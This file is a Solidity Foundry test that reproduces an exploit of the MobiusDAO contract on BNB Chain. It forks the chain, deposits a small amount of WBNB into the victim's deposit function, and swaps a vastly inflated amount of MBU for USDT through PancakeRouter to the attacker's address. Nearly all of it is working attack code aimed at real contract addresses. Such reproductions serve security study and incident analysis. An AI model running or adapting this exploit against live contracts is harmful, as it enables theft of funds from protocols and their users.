// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";
import {IPancakeRouter02} from "../../utils/IPancakeRouter02.sol";

// Interface for the MobiusDAO victim contract
interface IMobiusDAO {
    function deposit(address _userAddress, uint256 _wantAmt) external;
}

contract Exploit_MobiusDAO is TestHarness, TokenBalanceTracker {
    IMobiusDAO internal constant victim = IMobiusDAO(0x95e92B09b89cF31Fa9F1Eca4109A85F88EB08531);
    IPancakeRouter02 internal constant pancakeRouter =
        IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    IWETH9 internal constant wbnb = IWETH9(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 internal constant usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal constant mbu = IERC20(0x0dFb6Ac3A8Ea88d058bE219066931dB2BeE9A581);

    function setUp() external {
        cheat.createSelectFork(vm.envString("RPC_URL"), 49_470_429);

        // The attacker funds the contract with 1 BNB to start the attack
        cheat.deal(address(this), 1 ether);

        addTokenToTracker(address(wbnb));
        addTokenToTracker(address(usdt));
        addTokenToTracker(address(mbu));

        updateBalanceTracker(address(this));
    }

    function test_attack() external {
        console.log("===== Initial Balances =====");
        logBalancesWithLabel("Attacker", tx.origin);
        logBalancesWithLabel("Attacker Contract", address(this));
        logBalancesWithLabel("Victim", address(victim));

        console.log("===== STEP 1: Deposit BNB to WBNB =====");
        wbnb.deposit{value: 0.001 ether}();

        logBalancesWithLabel("Attacker", tx.origin);
        logBalancesWithLabel("Attacker Contract", address(this));
        logBalancesWithLabel("Victim", address(victim));

        console.log("===== STEP 2: Approve victim contract to spend WBNB =====");
        wbnb.approve(address(victim), 0.001 ether);

        console.log("===== STEP 3: Call deposit() on victim contract =====");
        victim.deposit(address(wbnb), 0.001 ether);

        logBalancesWithLabel("Attacker", tx.origin);
        logBalancesWithLabel("Attacker Contract", address(this));
        logBalancesWithLabel("Victim", address(victim));

        console.log("===== STEP 5: Appove PancakeRouter to spend MBU =====");
        mbu.approve(address(pancakeRouter), type(uint256).max);

        console.log("===== STEP 6: Swap all MBU for USDT =====");
        address[] memory path = new address[](2);
        path[0] = address(mbu);
        path[1] = address(usdt);

        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            30 * 10 ** 24, // Same as the amount in the original exploit
            //mbu.balanceOf(address(this)), // If using all MBU, it fails with Pancake: OVERFLOW
            0, // Accept any amount of USDT
            path,
            address(tx.origin),
            block.timestamp + 1
        );

        logBalancesWithLabel("Attacker", tx.origin);
        logBalancesWithLabel("Attacker Contract", address(this));
        logBalancesWithLabel("Victim", address(victim));

        console.log("===== Attack completed! =====");
    }
}
